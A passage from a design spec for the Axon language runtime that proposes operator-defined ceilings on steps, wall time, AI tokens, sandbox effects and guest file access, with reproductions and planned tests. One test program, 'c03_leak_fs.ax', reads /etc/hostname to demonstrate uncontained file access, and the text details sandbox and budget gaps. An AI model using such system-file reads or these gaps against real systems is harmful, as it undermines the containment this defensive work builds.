`axon-os/src/corrigible.rs:13`), but it covers supervised jobs only. `AXON_OS_TIMEOUT_MS` (`axon-os/src/runtime.rs:222-227`,
default 30 s) applies only under `axon-os`.

**Reproduction.**
```
$ cat s01_while_true.ax
fn main() {
    let i = 0
    while true { i = i + 1 }
}
$ timeout 5 axon run s01_while_true.ax                 -> rc=124 (killed by timeout(1))
$ AXON_ENGINE=tree timeout 5 axon run s01_while_true.ax -> rc=124
```
Throughput (`s03_count.ax`, a 20,000,000-iteration `while` summing `i`): `AXON_ENGINE=vm` 0.54 s, `tree` 4.77 s, native
0.01 s (native was probably folded or vectorised [INFERENCE]).

**Corpus.** 449 check-clean programs whose effects exclude Net/Exec/Hal/Bpf/Tee, run with `AXON_AI_MOCK=1`, default engine,
30 s timeout: 306 exit 0, 138 nonzero, **5 TIMEOUT**. All 5 are intentional non-terminators: `examples/mobile/lifecycle.ax`,
`examples/jobs/runaway.ax`, `examples/r27/killable_agent.ax`, its hardset copy, `profiles/linux-microvm/fixtures/loop.ax`.
Slowest terminating: `vm_perf/collatz.ax` 6.3 s, `qsort` 5.08, `mandelbrot` 1.81, `packed` 1.26, `arr-sum` 1.13. 10
programs take > 1 s.

**Options.**
- A (recommended): **opt-in `steps` and `wall_ms`** through the CE-2 ceiling and `AXON_MAX_STEPS` / `AXON_WALL_MS`.
  Interpreter-only. Native refuses at build and run (E0910 / exit 2) like every other ambient ceiling. Blast radius without
  a ceiling: **0**.
- B: A, plus a **default** step ceiling on every run. The default has to clear the slowest legitimate program (collatz 6.3 s on
  vm; step count not measured) with a wide margin. Its only effect is to turn the 5 intentional non-terminators into exit 9.
  It does nothing for a program that is slow but finite. Blast radius: 5 tracked programs change outcome. Every test that
  relies on a kill (e.g. the R27 killable tests) needs a ceiling override [INFERENCE: count not measured].
- C: keep and document the narrow claim (`opportunities.md:1957`).

**Design (A, decided engineering).**
- *Step definition.* One step is one loop-body entry (`while`, `while let`, `for`) or one fn-body entry. Both engines count
  at those AST-level points, so tree and VM count identically. The VM counts at its back-edges and `ForNext`.
- *Exhaustion.* Exhaustion is **E1006**, exit 9 (the R27 `RESOURCE_BOUND` meaning). The message names the axis, the ceiling
  and the fn. `wall_ms` is checked at the same checkpoints every 4096 steps and also exits E1006/9 with axis `wall_ms`.
- *Cost when no ceiling is set.* None: the VM emits metered ops only when a step or wall ceiling is active. Under a ceiling, the
  `pure.rs` fused loops and the `purefn` tier are disabled (they have no checkpoint), and their bodies run on the op loop. This
  keeps `scripts/vm_perf_gate.sh` (0.5 % relative budget per program) untouched for unceilinged runs. The tree engine checks
  an `Option` at each point.
- *Parity.* `scripts/vm_parity.sh` (gate.sh:1093-1096, stage S22, 84.2 s in `salvage-gate-1.log`) gains cases that run under
  `AXON_MAX_STEPS` and must exit 9 at the same step in both engines (same stdout prefix).
- *Native.* Refused. Counting in codegen loop headers is possible, but it is a second implementation that must match the
  interpreter step for step; E0910 is the repo's answer to that.

**Tests.**
- Fail-first: `step_ceiling_halts_while_true_e1006_exit9` (tree and vm), `step_ceiling_counts_calls` (mutual recursion
  under the depth limit), `step_ceiling_equal_across_engines` (the exact step at which stdout stops), `wall_ceiling_halts_exit9`.
- `[REVISED: CED-4]` Fail-first: `step_ceiling_halts_fused_pure_loop`, using the `s03_count.ax` shape (a counted `while` over
  `i64` locals). Observed at a5310878: `AXON_ENGINE=vm AXON_VM_TRACE=1` prints `vm: pure main 0 exprs, 1 loops`, so it lowers
  to the fused `LoopCode` tier (`interp/vm/pure.rs:1069`, `iterate` `:1281-1300`). The test also asserts that trace line
  under no ceiling, so a lowering change cannot silently turn it into a non-fused test. This test kills the "fused-loop
  disable" g01 row.
- Guard (passes today): `no_ceiling_vm_emits_no_step_ops` (VM trace count).
- `[REVISED: CED-5]` `native_refuses_axon_max_steps` goes in `integration_fixtures.rs` (cfg codegen, `--strict` only).

All are RED at a5310878 except the guard.

**Cost.** ~250 lines across `eval.rs`, `interp.rs`, `vm/compile.rs`, `vm/mod.rs`, the gating in `vm/pure.rs`/`purefn.rs`, plus
`env_registry.rs`, `main.rs:3724`, `axon-rt/src/lib.rs:2127`. `vm_perf_gate.sh` must stay green.

---

### CE-6 (P2, NH-C6) The token cap charges a prompt-length estimate, never the reply

**Anchors.** `interp/builtins.rs:6040` `est_tokens = (prompt.len() as i64) / 4 + 1`; `:6080-6098` E1303 gate charges
`est_tokens` before dispatch; `:6184-6213` the live path charges the cost meter with real `input+output` usage
(`axon_ai::complete_with_model_usage`, `axon-ai/src/lib.rs:633`) but does **not** touch `tokens_used`; replies are capped
at `max_tokens` 1024 (`axon-ai/src/lib.rs:537,542,699`). `parse_token_budget` `interp.rs:7573-7585` (malformed → 0, fail
closed). VM operators set the cap through MMDS → `axon-guest-init/src/main.rs:104,163`.

**Reproduction** (`AXON_AI_MOCK=1`):
```
$ cat t01_token_cap_prompt_only.ax
fn main() {
    let a = ai_complete("x")
    println(to_str(ai_cost_spent()))
    let b = ai_complete("y")
    println(to_str(ai_cost_spent()))
    match a { Ok(s) => println(to_str(len(s))), Err(e) => println(e) }
}
$ AXON_BUDGET_TOKENS=2 axon run t01_token_cap_prompt_only.ax
3
6
63
rc=0                 # two 63-char replies; 2 "tokens" charged (1 per 1-char prompt)
$ AXON_BUDGET_TOKENS=1 axon run t01_token_cap_prompt_only.ax
3
axon: ai policy: [E1303] `main` exceeded the run's token budget of 1 (used 1, this call needs ~1) — raise AXON_BUDGET_TOKENS or reduce AI work
rc=5
```

**Options.**
- A (recommended): **reserve, then settle.** Before dispatch, check `used + prompt.len() (bytes) + 16 + max_tokens <= cap`. After
  dispatch, charge real `input+output` (live), or `prompt_est + reply.len()/4 + 1` (mock and replay, deterministic). A live
  run then cannot exceed the cap, provided input tokens ≤ prompt bytes + 16 [INFERENCE: holds for byte-level BPE tokenizers;
  not verified against the provider]. Documented unit: "provider tokens, input + output".
- B: keep the estimate, and rename it in the docs to "prompt-size estimate; replies uncharged".
- C: A, plus a USD cap (`ai_usd_micro`, using the tier rates already in `ai_routing::Tier::cost_micro`).

**Blast radius (A).** 0 tracked programs set the cap. `ambient_token_budget_env_var_is_actually_enforced`
(`cli_run.rs:25002-25088`) asserts that caps 20/30 split two 15-token prompts. Under A each call reserves ≥ 1040+, so the
test's numbers are rewritten (same four properties). `axon-guest-init` policies with small `budget_tokens` would refuse
earlier [INFERENCE: fixtures under `crates/axon-guest-init/tests/policy_refusals.rs` use the field; values not checked].

**Fail-first tests:** `token_cap_charges_reply` (mock: one call with a 63-char reply charges more than its prompt; RED),
`token_cap_reserves_max_tokens` (cap 100, any prompt → E1303 before dispatch; RED).

**Cost.** ~40 lines in `builtins.rs:6036-6215`. Sequenced after AF-4 [pending asi-fixes-spec.md] so extracts settle the same way.

---

### CE-7 (P1, decided) `goal_*` dispatch demands `AI`/`Net` that its metric checks for itself

**Anchors.** `[REVISED: CED-9]` `crates/axon-core/src/builtins.rs:2740-2748` (`builtin_effect_row`): `goal_run`,
`goal_run_constrained`, `goal_run_categorical`, `goal_run_random`, `goal_run_multistart`, `goal_continue` and `goal_eval` all
map to `["AI","Net","IO"]`, because the `@[adaptive]` metric "may ai_complete". `[REVISED: CEA#12]` The single change site
is the gate call `interp/builtins.rs:779-781`, `self.pre_effect_gate(name, crate::builtins::builtin_effect_row(name), ..)`.
`pre_effect_gate` (`:584`) uses that row only for the sandbox effect check (`:696-715`), which tests it against the
**active sandbox**, whichever that is: the ambient `AXON_ALLOWED_EFFECTS` sandbox, a principal grant, or a sandbox the
program made with `sandbox_create`/`sandbox_run`. `interp/goal.rs` contains no model call (`grep 'axon_ai::\|ai_complete'
interp/goal.rs`: 0 hits).

**Reproduction.**
```
$ AXON_ALLOWED_EFFECTS=IO axon run crates/axon-core/tests/fixtures/goal_run_hillclimb.ax
axon: sandbox violation: builtin `goal_run` requires effect `AI` which is not in the active sandbox's allowed set {"IO"} (principal handle 0)
rc=8                       # the metric is (x-7)*(x-7); no model is ever called
```
`[REVISED: CEA#12]` The same refusal happens in a sandbox the program builds itself:
```
$ cat g02_goal_in_sandbox.ax
@[adaptive(metric: cost, target: 0.0)]
fn measured(x: i64) -> i64 {
    let d = x - 7
    d * d
}

fn job(x: i64) -> i64 {
    let best = goal_run("measured", 0.0, 4)
    println(to_str(best))
    0
}

fn main() {
    let p = principal_root("p", true, false, false, 100)
    let sb = sandbox_create(p, "IO")
    let r = sandbox_run(sb, "job", 0)
    println(to_str(r))
}
$ AXON_AI_MOCK=1 axon run g02_goal_in_sandbox.ax
axon: sandbox violation: builtin `goal_run` requires effect `AI` which is not in the active sandbox's allowed set {"IO"} (principal handle 7624178074281970836)
rc=8
```
The metric's own AI calls are gated at their own dispatch:
```
$ cat g01_goal_ai_metric.ax
@[adaptive(metric: cost, target: 0.0)]
fn measured(x: i64) -> i64 {
    let r = ai_complete("score this")
    let d = x - 7
    d * d
}

fn main() {
    let best = goal_run("measured", 0.0, 4)
    println(to_str(best))
}
$ AXON_AI_MOCK=1 AXON_ALLOWED_EFFECTS=IO,AI,Net AXON_ALLOWED_NET= axon run g01_goal_ai_metric.ax
axon: sandbox violation: builtin `ai_complete` is not permitted to reach host `api.anthropic.com`: the active sandbox restricts it to [] (principal handle 0)
rc=8
```

**Fix (decided).** The *dispatch* row for the seven `goal_*` run-variants is `["IO"]`. A new
`crate::builtins::dispatch_effect_row(name)` returns `["IO"]` for those seven and `builtin_effect_row(name)` for everything
else, and the call at `interp/builtins.rs:779-781` uses it.

The static row (`builtin_effect_row`, used by `axon caps`, effect rows and E1310) is unchanged, because it is a sound
over-approximation for static reporting. `[REVISED: CEA#12; integrator ruling 5]` `builtin_effect_row_agrees_with_impurity`
(`builtins.rs:3386`) stays exactly as it is.

Any model call the metric makes is still checked at its own `ai_complete`/`ai_extract_*` dispatch, inside the same active
sandbox. Native needs no change (no ceiling support).

**Departure from CAP-3, stated** (`[REVISED: CEA#12]`). `tasks/capability-surface-spec.md` CAP-3 (`:255`) keeps "one
classifier". This item adds a second, narrower dispatch row for exactly seven builtins. It is pinned by a test
(`dispatch_row_is_subset_of_static_row`, below), so the two can differ only in that direction and only for those names.

Alternatives:
- (a) Leave it. Rejected: any AI-withholding ceiling (CE-2, CE-10) would then falsely refuse the `goal_*`-only programs.
  `[REVISED: CEA#7]` At a5310878 there are 22 check-clean programs whose only `AI` is a `goal_*` row; 21 of them need nothing
  else from an AI-less ceiling. `examples/asi/persistent_learner.ax` stays refused without FS (its R45 E1005s are
  `read_file`/`env_var`/`write_file`). Examples: `examples/asi/learn_linear.ax`,
  `crates/axon-core/tests/fixtures/goal_run_optimizer.ax`.
- (b) Compute the metric's transitive effects at dispatch. Rejected: the inner dispatch check already gives the exact answer
  at the exact time.

**Blast radius.** `[REVISED: CEA#12]` It loosens a refusal on every sandbox kind: ambient `AXON_ALLOWED_EFFECTS`, principal
grants, and program-created `sandbox_create`/`sandbox_run` sandboxes (g02). The loosened path is any `goal_*` call whose
metric makes no model call: those runs succeed instead of exiting 8. A `goal_*` call whose metric does reach a model is still
refused when the sandbox lacks `AI`; the refusal moves from the `goal_*` call to the metric's `ai_complete`. No test asserts
the old refusal [INFERENCE: `git grep 'goal_run' -- crates/*/tests` shows no `AXON_ALLOWED_EFFECTS` pairing; the build must
confirm].

**Tests.**
- Fail-first: `goal_run_pure_metric_runs_without_ai_grant` (hillclimb under `AXON_ALLOWED_EFFECTS=IO`; RED: exit 8 today).
- Fail-first: `goal_run_pure_metric_runs_in_program_sandbox` (g02; RED: exit 8 today).
- Guards (`[REVISED: integrator ruling 5]`), required:
  - `goal_run_ai_metric_still_refused_without_ai_grant`: `AXON_AI_MOCK=1 AXON_ALLOWED_EFFECTS=IO` + g01 → exit 8, with the
    message naming `ai_complete`.
  - `goal_run_ai_metric_refused_in_program_sandbox`: g02 with the g01 metric → exit 8 naming `ai_complete`.
  - `dispatch_row_is_subset_of_static_row`: for every name in `BUILTINS`, the dispatch row ⊆ the static row, and they
    differ only for the seven listed names.

**Cost.** ~20 lines in `crates/axon-core/src/builtins.rs` (new fn) and `interp/builtins.rs:779-781`, plus a g01 row on the
inner-AI guard.

---

### CE-8 (P0; no-key half NH-C10, build-time half NH-C7) Native AI builds (O031 / O-HI-03)

**State at a5310878, measured.** O031's "native dials the model live" is **already closed in effect**.
`refuse_unaudited_native_live_ai` (`axon-ai/src/lib.rs:410-430`, commit 105444e6 2026-09-22) exits 2 on every live dispatch
of `__axon_ai_complete` and the five `__axon_ai_extract_*` bridges (call sites `lib.rs:443,1078,1129,1187,1232,1282`), unless
`AXON_AI_MOCK` is set. It returns early when no key resolves (`lib.rs:421-423`).
```
$ cat n01_offline.ax
fn main() {
    let r = ai_complete("hello")
    match r { Ok(s) => println("ok"), Err(e) => println("err=" + e) }
    println("r=2")
}
$ axon build n01_offline.ax -o n01_offline.bin                  -> rc=0
$ axon run n01_offline.ax                                        -> [E1300] `ai_complete` cannot run: no model reachable ... rc=5
$ ./n01_offline.bin                                              -> err=ANTHROPIC_API_KEY (or AXON_AI_API_KEY) is not set / r=2, rc=0
$ ANTHROPIC_API_KEY=sk-dummy-not-real AXON_AI_BASE_URL=http://127.0.0.1:18788 ./n01_offline.bin
axon: `ai_complete` reached a LIVE model call, but this is a NATIVELY BUILT binary and AI-call auditing is honoured by the interpreter only.
rc=2                                                             # 127.0.0.1:18788 listener: no connection within 4 s
$ AXON_AI_MOCK=1 ./n01_offline.bin                               -> ok / r=2, rc=0
```
**Silent wrong answer (no key, no mock):**
```
$ cat n02_fallback.ax
@[ai(policy(fallback: "FB"))]
fn ask() -> str {
    match ai_complete("hello") { Ok(s) => s, Err(e) => "err=" + e }
}

fn main() { println(ask()) }
$ axon run n02_fallback.ax       -> FB                                              rc=0
$ ./n02_fallback.bin             -> err=ANTHROPIC_API_KEY (or AXON_AI_API_KEY) is not set   rc=0
```
`AsiFixes` reported the same for the extract bridges (`ai_extract_generic.ax`: key error returned through `Err`, rc 0). I did
not re-run that; it follows from the shared early return at `lib.rs:421-423` [INFERENCE].

**No-key half → NH-C10** (`[REVISED: CEA#1, CEA#2; integrator ruling 1]`). The draft called this "decided" and "refuses no
program that runs today". That was wrong. The early return is deliberate: `lib.rs:414-420` keeps the key error "a catchable
`Err` that a program doing optional AI enrichment can fall back from". Any fix changes what a native binary run without a
key does.

Options:
- **A: always refuse.** Delete `lib.rs:421-423`, so native non-mock AI dispatch always exits 2, for `ai_complete` and all
  five extract bridges. Effects:
  - Every native AI binary run without a key and without mock goes from rc 0 to **exit 2**. At a5310878, 18 tracked direct-AI
    programs build natively.
  - n02-style `fallback:` programs exit 2 where the interpreter prints the fallback. 1 tracked program has the attribute,
    `examples/asi/ai_fallback.ax:20`; `llm_gateway.ax` uses `fallback:` only as a struct field.
  - Tests: see below.
- **B: native mirrors the interpreter** (recommended). With no key and no mock, if the calling fn declares `fallback:`, return
  it, which is what `interp.rs:5598-5607` `current_ai_fallback` does (static: the current fn's attribute literal). Otherwise
  print the interpreter's E1300 line and exit 5. This gives byte parity for n01 (interp E1300 rc 5) and n02 (`FB` rc 0), and
  it refuses no program the interpreter runs.
  - Cost: codegen passes the fn's fallback literal (or null) to the bridges, which is an ABI change on `__axon_ai_complete`
    and the five extract bridges [INFERENCE: ~100-150 lines across `codegen/`, `axon-ai`]. Extract semantics follow whatever
    the interpreter does for each extract [pending asi-fixes-spec.md AF-1].
  - Same test rewrites as A, asserting E1300/exit 5 instead.
- **C: keep + document** the divergence in `axon build --help` and `spec/axon-for-llms.md`. This leaves a silent wrong answer
  (the third-worst outcome).

Tests that break under A or B (`[REVISED: CEA#2]`):
- `axon-ai/src/lib.rs:1533` `extract_bridges_report_missing_api_key_and_tolerate_nulls`
- `axon-ai/src/lib.rs:1760` `flat_extract_bridges_report_missing_api_key_and_tolerate_nulls`

Both remove the key and `AXON_AI_MOCK`, call the bridges **in process**, and assert rc 1 plus a key message. Under A or B the
bridge would `process::exit`, which kills the `cargo test` binary. They must be rewritten to run the bridge in a subprocess
and assert the new exit code. The draft's grep had omitted `crates/axon-ai`.

New tests (`integration_fixtures.rs`, cfg codegen, `[REVISED: CED-5]`): `native_no_key_matches_interp` (n01: E1300 exit 5
under B, exit 2 under A) and `native_fallback_matches_interp` (n02: `FB` under B). Parity harnesses pin `AXON_AI_MOCK=1`
(gate.sh) and are unaffected by any option.

**Build-time half (NH-C7).** Should `axon build` keep accepting AI programs?
- A (recommended): keep, plus the fix above, plus docs. `axon build --help` and `spec/axon-for-llms.md` say: "a native binary
  runs AI only under `AXON_AI_MOCK`; otherwise it exits 2". O031 and O-HI-03 get stamped `CLOSED in effect by 105444e6;
  no-key divergence by CE-8`. Blast radius: 0.
- B: refuse at build (E0910) any program that reaches an AI builtin. `[REVISED: CEA#8]` Recounted at a5310878 by rebuilding
  all 41 AI-effect programs:
  - *Direct-call definition:* 18 of 19 direct-AI programs build today and would be refused. The 19th, `examples/asi/llm_cache.ax`,
    is already E0701/E0910. (The draft's "20 of 23" was wrong: `examples/asi/ad_optimizer.ax` has `ai_` only in comments at
    :26 and :31.)
  - *Static-row definition* (`AI` in `builtin_effect_row`, which includes `goal_*`): 18 + 5 = 23 would be refused. The 5
    goal-only programs that build today include `goal_run_hillclimb.ax`, `goal_run_optimizer.ax` and `adaptive_basic.ax`.
  - Tests that would flip: `build_refuses_non_balanced_ai_tier_e0910_r3` (`cli_run.rs:10922`, asserts "a balanced-tier
    ai_complete must still BUILD", `:10990`), `build_refuses_per_call_ai_tier_e0910_f062` (`:10995`),
    `build_refuses_ai_call_budget_e0910_f141` (`:11066`), and
    `native_binaries_link_the_ai_runtime_only_when_an_ai_builtin_is_reachable` (`:30648`).
  - Native parity harnesses whose program lists include AI calls: 8 scripts (`agent_action_parity.sh`,
    `exit_code_parity.sh`, `fuzz_parity.sh`, `handler_resume_parity.sh`, `wasm_aot_stdout_parity.sh`,
    `wasm_browser_examples_parity.sh`, `wasm_examples_parity.sh`, `wasm_parity.sh`).
- C: native audit parity (native writes `ai_call` provenance), which makes native live AI legitimate. Large (R1 ABI work).
  Out of scope.

---

### CE-9 (P3, NH-C8) The guest substrate needs `FS` (O034)

**Anchors.** `scripts/axon_kernel_gate.sh:119-136`: good-agent run with `AXON_VM_ALLOWED_EFFECTS=IO,FS`, because the
guest interpreter must `openat` `/axon/program.ax` (`axon-guest-init/src/main.rs:115-122` execs `/usr/bin/axon run
/axon/program.ax`). Grant resolution `axon-vm/src/admit.rs:268-296`: an override is checked only against a manifest
and may not widen it (`OverrideWidens`); without a manifest the override *is* the grant.

**Findings.**
1. A program whose honest manifest is `["IO"]` can run in the guest only if it also holds `FS`, which is O034's point.
2. With a manifest present, the override that adds `FS` is refused. Observed with an axon-vm built 2026-09-22 (the same
   `OverrideWidens` rule as a5310878's `admit.rs:273-290`, which I read):
   ```
   $ axon build agent_task.ax --emit-manifest        # effect_union ["IO"]
   $ AXON_VM_ALLOWED_EFFECTS=IO,FS axon-vm run agent_task.ax --kernel fake_kernel --initrd fake_kernel
   AXON_VM_ALLOWED_EFFECTS may only narrow the manifest's effect grant, not widen it. Not in the manifest: FS. Manifest grants: IO
   rc=2
   ```
   So a manifested IO-only program cannot run in the guest at all. A guest that runs either holds `FS` (no manifest, explicit
   override) or is a program that declared `FS`.
3. `axon_kernel_gate.sh:80-84` writes `agent_task.axmeta` next to the program before the Layer-3 run at `:133`. By finding 2,
   the good-agent case would then fail with rc 2. [INFERENCE: not run. The script builds with cargo, which this draft may not;
   it is not wired into `gate.sh` (`git grep axon_kernel_gate scripts` shows only its own usage line), and no guest image
   exists in this worktree (`dist/guest/` absent).]

**Options** (O034:1269-1283):
- A: keep the explicit `IO,FS` in the gate and document "guests hold FS". Blast radius 0. The hole remains: a guest program
  can read any file the guest can see.
- B: axon-vm unions a documented substrate baseline `FS` into every grant. Blast radius 0. It makes A's hole the default.
- C (recommended, pending a ≤ 1-day spike): load before gate. `axon-guest-init` (TCB) opens `/axon/program.ax` and hands the
  interpreter the bytes before the effect policy covers the interpreter's syscalls. `[REVISED: CEA#9]` The interpreter has no
  stdin source today. Observed: `axon run - < s01_while_true.ax` → `error: Axon source files must have a .ax extension (got
  '-')`, rc 1; only `axon caps` reads stdin. So C's cost includes an interpreter source-from-fd/stdin path, for example
  `axon run --source-fd N`. [INFERENCE: whether the guest kernel's gate can start *after* init's read and *before* the
  interpreter's first syscall needs the spike; `axon-guest-kernel/src/enforce.rs:195-260` classifies by syscall number.]
- D: path-scoped `openat` in the syscall gate (only `/axon/program.ax` allowed). Strongest, and the most work: the gate would
  need argument inspection.

**Blast radius (C/D).** The guest programs: `profiles/linux-microvm/fixtures/*.ax` (6) and `examples/flagship/agent_task*.ax`.
No gate.sh stage runs them (S08 "PSV real-guest boot" exited 77 = skipped in `salvage-gate-1.log`).

**Cost.** C: the spike, an interpreter stdin/fd source (CEA#9), ~100 lines in `axon-guest-init`, an image rebuild, and a
kernel-gate run on a KVM host (firecracker present at `/usr/local/bin/firecracker`, `/dev/kvm` present). D: guest-kernel
work; its own spec.

---

### CE-10 (P1, NH-C2) What does a run with no ceiling get? (R45 default)

**Anchors.** `capabilities.rs:350-363` `set_require_contained` / `require_contained`; `:464-468` deny-all synthesis for
`main` with no `@[contained]`; E1005. R45:5 "gated behind an explicit flag (default off)". R45 Q2 (`:224`) estimated that
flipping it "would refuse 17% of existing programs".

**Reproduction.**
```
$ cat c03_leak_fs.ax
fn leak() -> str { match read_file("/etc/hostname") { Ok(s) => s, Err(e) => "" } }
fn main() { println(to_str(len(leak()) > 0)) }
$ axon run c03_leak_fs.ax                      -> true, rc=0
$ axon run --require-contained c03_leak_fs.ax
{"schema":"axon-diag/1","severity":"error","code":"E1005","file":"c03_leak_fs.ax","line":1,"col":1,"message":"`read_file(\"/etc/hostname\")` is reached from `main`, which declares no capabilities - ..."}
rc=2
$ axon run --require-contained c01_unannotated_ai.ax   -> E1005 "`ai_complete(...) [host api.anthropic.com]` is reached from `main` ...", rc=2
```

**Measured blast radius at a5310878** (699 tracked `.ax`: `examples/` 182, `crates/*/tests` 284, benchmark corpora 211, other
22; 607 are check-clean). Method: `axon check`, `axon check --require-contained` and `axon caps --json` on each file
(scan.json).

| no-ceiling default | tracked check-clean programs refused | inline tests (approx.) |
|---|---|---|
| A: unchanged (recommended) | **0** | 0 |
| B: R45 static deny on by default | **73 / 607 = 12.0 %** (examples 29/161, crate fixtures 19/216, benchmarks 20/211, other 5/19). `[REVISED: CEA#7]` 20 of the 41 AI-effect programs: all 19 direct callers (E1005 naming the AI builtin) plus `persistent_learner.ax` (fs/env E1005s) | ≥ 56 of 407 test fns that call `axon run` hold an ungranted capability builtin [regex lower bound] |
| C: B + runtime deny, without a ceiling, of effects `AI`/`Net`/`Exec`/`Hal`/`Bpf`/`Tee` and any `fs:*` capability | `[REVISED: CEA#6]` **105**: 126 programs hold one of that set, minus the 21 `goal_*`-only programs CE-7 frees. `env`, `native:*` and `dstore` capabilities are not in the set | not measured |
| D: literal deny-all (no effect at all without a ceiling) | **406 / 607** (anything with an effect, `IO` printing included) | most of the suite |

R45's own `--help` says what it does not cover: `sandbox_run` targets, `redteam_check` and `assert_deployable` are not
statically reachable from `main`. The runtime half of a ceiling (CE-2 `effects`/scopes) does cover them, which is why CE-2
couples both.

**Recommendation.** A for bare runs. **A ceiling's presence turns R45 on** (CE-2 table, last row). The deny-by-default property
then holds exactly where an operator has stated authority, and no program that runs today is refused (worst-outcome rule).
`axon deploy` (R45 Q2) keeps its separate decision.

**Fail-first test:** `ceiling_implies_require_contained` (c03 + an empty-scope ceiling → E1005, rc 2; RED).

---

## 3. The proposed model (one page)

1. **Authority is data the operator writes**: `axon-ceiling/1` (CE-2). It is read once, before program code runs. Its digest is
   recorded in `run_start`. It is never writable by the run (self-overlap is E1007).
2. **Inside a ceiling, the default is deny.** Every key is required, and lists are allow-lists. R45 static containment is on
   (CE-10). The AI endpoint is pinned to `net` (CE-1/CE-3). Callee AI calls count against every enclosing budget (CE-4).
   Steps, wall time, AI tokens (reserve/settle, CE-6) and AI calls are bounded run-wide.
3. **Outside a ceiling, nothing changes** (NH-C2 = A). Bare runs keep today's semantics. The docs say so in one sentence:
   "without `--ceiling`/`AXON_CEILING` a run is bounded only by what its source declares".
4. **Narrowing composes.** env var ∩ ceiling ∩ `@[contained]` ∩ `sandbox_create`. Nothing widens.
5. **Engines.** The interpreter enforces everything. Native refuses under any ceiling (E0910 build / exit 2 run). Outside a
   ceiling, native makes no live AI call: it refuses (exit 2) once a key resolves, and runs under mock. What it does with
   no key and no mock is NH-C10 (`[REVISED: CEA#1]`).

Relations:
- **R45**: becomes the static half of a ceiling. The flag stays for bare runs. R45 Q3's env form is subsumed by `AXON_CEILING`.
- **R38**: `[REVISED: CEA#10, CEA#11]` R38's sketch `.ceiling(caps!{..}).budget(Budget{tool_calls, ai_usd_micro, wall_ms,
  max_depth})` (R38:171-177) does **not** map one-to-one onto `axon-ceiling/1`:
  - Shared: `wall_ms` and `max_depth`.
  - `ai_usd_micro` exists only if NH-C6 = C.
  - `tool_calls` counts host tools, which have no counterpart until R38's tool registry exists. `ai_calls` is a different
    axis.
  - R38's ceiling is an effect row (R38:508-516; see NH-C1 A1/A2).

  R38:314-315's provenance rule is met by "operator file, digest recorded, not run-writable". An R38 builder would populate
  the interpreter's internal `Ceiling` (§8.4) from its own row-shaped input; this spec does not define that mapping.
- **NH-R1** (`tasks/unattended-auth-spec.md`): the `axon-approval/4` envelope bounds the *repair loop* (`budget` =
  `{max_proposals, deadline_ms, check_timeout_ms, candidates, max_steps}`, `:104`; `max_steps` is loop steps, not interpreter
  steps). A ceiling bounds *one program run*. They do not overlap today. NH-C9 asks whether a later envelope version should
  bind a `ceiling_sha256` that every `check` run inside the loop must use.
  - `[REVISED: CEA collision note]` The fence already sets `AXON_ALLOWED_NET=""` for check children
    (`axon-cortex/tests/cli.rs:3261`). Under CE-1 they pin AI to the empty list, the same outcome as today's dispatch refusal.
  - An operator's `AXON_CEILING` would **not** reach those children if the fence clears the environment [INFERENCE: from
    NH-R1 §E10 citing `runner.rs:3627-3632`, not read]. NH-C9 = A would carry it explicitly.
- **axon-vm / guest-init**: MMDS policy already maps to `AXON_ALLOWED_EFFECTS` and `AXON_BUDGET_TOKENS`
  (`axon-guest-init/src/main.rs:84-166`). Passing a ceiling file through MMDS is a follow-up and is not specified here.

---

## 4. Diagnostics and exit codes

| code | meaning | exit | status |
|---|---|---|---|
| E1006 | run exceeded an operator `steps` or `wall_ms` ceiling (axis named) | 9 | new; free at a5310878 (`git grep E1006` 0 hits) |
| E1007 | ceiling file missing, unreadable, malformed, unknown/missing key, or inside its own `fs_write` scope | 2 | new; free |
| E1303 | existing run token cap; gains the `ai_calls` axis wording | 5 | existing |
| E1005 | existing R45; now also triggered by ceiling presence | 2 | existing |
| (none) | CE-1/CE-3 pin violations stay the existing catchable `Err` "is not in this program's net allowlist"; no request is sent | - | existing |

Exit 9 reuses the R27 meaning `RESOURCE_BOUND` (`axon-os/src/corrigible.rs:13`). No interpreter constant uses 9
(`interp.rs:1251-1284`: 3, 4, 5, 6, 7, 8). E1304 was provisionally reserved while drafting and is **released**; `AsiFixes`
claimed it for AF-1 (`ai_extract::<T>` with an unsupported T refused at check).
Siblings `LangForms` and `AsiFixes` were told of these reservations (no reply asking to change them). Re-grep at build time.

---

## 5. Shared mechanics (every built item)

- **pci theme** per behaviour-changing commit (`governance/notes/pci-themes/<hash8>.json`, `scripts/pci_delta.py:38-62`).
- **CHANGELOG** line per item. CE-4 and CE-6 carry a migration note.
- **g01 rows** from M4680-M4699 (20 ids). `[REVISED: CED-1, CED-4, CED-5]` Each row names the test that kills it:
  - CE-1 ×2 (empty-ambient pin, glob intersection): killed by the `ai_pin_hosts_*` unit tests, target
    `-p axon-core --no-default-features --lib`.
  - CE-2 ×5: missing key, unknown key and self-overlap/`fs_write` null are killed by `ceiling.rs`; intersection by
    `ceiling_intersects_env_never_widens`; native refusal by `integration_fixtures` with `--features codegen` (strict-only).
  - CE-4 ×2.
  - CE-5 ×4: tree check, VM back-edge, fused-loop disable (killed by `step_ceiling_halts_fused_pure_loop`), wall.
  - CE-6 ×2.
  - CE-7 ×1: the inner AI check must survive; killed by `goal_run_ai_metric_still_refused_without_ai_grant`.
  - CE-8 ×1 if NH-C10 = A/B: killed in `integration_fixtures`.
  - CE-10 ×1.
  - Spare: 2.

  Each row gets attack markers per `scripts/v022_attack_markers.py`.
- **Refusal coverage**: run `scripts/v022_refusal_coverage.py`. Every new `return Err(`/refusal site it names gets a row or an
  EXEMPT with a reason.
- **Docs**: `spec/axon-for-llms.md` (ceilings, budget rule, native AI), `spec/language-tour.md` (budget paragraph only),
  `AXON_REFERENCE.md` env table (`:103-112`) + error table (E1006/E1007), `env_registry.rs` rows (`AXON_CEILING`,
  `AXON_MAX_STEPS`, `AXON_WALL_MS`), R3c amendment (CE-4), R45 and R38 status notes, `tasks/opportunities.md` stamps (O027,
  O031, O032, O034, O-HI-03, fuel line 1954). `spec/grammar.ebnf`: no change (no syntax).
- **Native refusal lists** (`main.rs:3724-3730`, `axon-rt/src/lib.rs:2127-2160`) gain `AXON_CEILING`, `AXON_MAX_STEPS`,
  `AXON_WALL_MS` in the same commit that adds each variable.

---

## 6. Gates and cost budget

The repo measures stage wall time with `stage_begin`/`stage_end` (`scripts/gate.sh:330-350`). They write
`gate-stages.<pid>.tsv` and print `(stage '<ID> <label>': N.Ns, exit R)`. The latest full run on disk is
`/var/tmp/r51-tmp/salvage-gate-1.log` (2026-11-01). Its serial stages add up to about 2065 s: S16 axon-core tests 609.3 s,
